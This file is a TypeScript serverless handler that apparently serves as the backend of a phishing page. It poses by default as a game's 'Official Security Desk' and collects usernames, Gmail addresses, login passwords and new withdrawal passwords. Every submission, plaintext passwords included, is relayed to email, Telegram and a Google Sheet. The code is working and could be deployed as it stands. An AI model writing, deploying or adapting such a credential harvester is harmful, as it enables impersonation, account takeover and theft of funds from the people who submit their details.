import {
  sendEmailNotification,
  sendTelegramNotification,
  sendToGoogleSheet,
} from "./_notifications.js";

export default async function handler(req: any, res: any) {
  // CORS Headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed. Use POST." });
  }

  try {
    let body = req.body;
    if (typeof body === "string") {
      try {
        body = JSON.parse(body);
      } catch (e) {
        return res.status(400).json({ error: "Invalid JSON body" });
      }
    }

    const {
      gameName,
      gmail,
      usernameOrPhone,
      loginPassword,
      newWithdrawPassword,
      timestamp,
      requestId,
    } = body || {};

    if (!gameName || !usernameOrPhone || !newWithdrawPassword) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const effectiveRequestId =
      requestId || "REQ-" + Math.floor(100000 + Math.random() * 900000);
    const effectiveTimestamp =
      timestamp ||
      new Date().toLocaleString("bn-BD", {
        dateStyle: "medium",
        timeStyle: "short",
      });

    const companyName = (
      process.env.COMPANY_NAME ||
      process.env.BUSINESS_EMAIL_FROM_NAME ||
      `${gameName} Official Security Desk`
    ).trim();

    // 1. Send Email Notification
    const emailStatus = await sendEmailNotification({
      gameName,
      requestId: effectiveRequestId,
      usernameOrPhone,
      gmail,
      loginPassword,
      newWithdrawPassword,
      timestamp: effectiveTimestamp,
      companyName,
    });

    // 2. Send Telegram Notification
    const telegramStatus = await sendTelegramNotification({
      gameName,
      requestId: effectiveRequestId,
      usernameOrPhone,
      gmail,
      loginPassword,
      newWithdrawPassword,
      timestamp: effectiveTimestamp,
      companyName,
    });

    // 3. Append Row to Google Sheet
    const googleSheetStatus = await sendToGoogleSheet({
      gameName,
      requestId: effectiveRequestId,
      usernameOrPhone,
      gmail,
      loginPassword,
      newWithdrawPassword,
      timestamp: effectiveTimestamp,
      companyName,
    });

    return res.status(200).json({
      success: true,
      requestId: effectiveRequestId,
      emailStatus,
      telegramStatus,
      googleSheetStatus,
    });
  } catch (err: any) {
    console.error("Vercel Serverless Function Error:", err);
    return res.status(500).json({
      success: false,
      error: err?.message || "Internal Server Error",
    });
  }
}
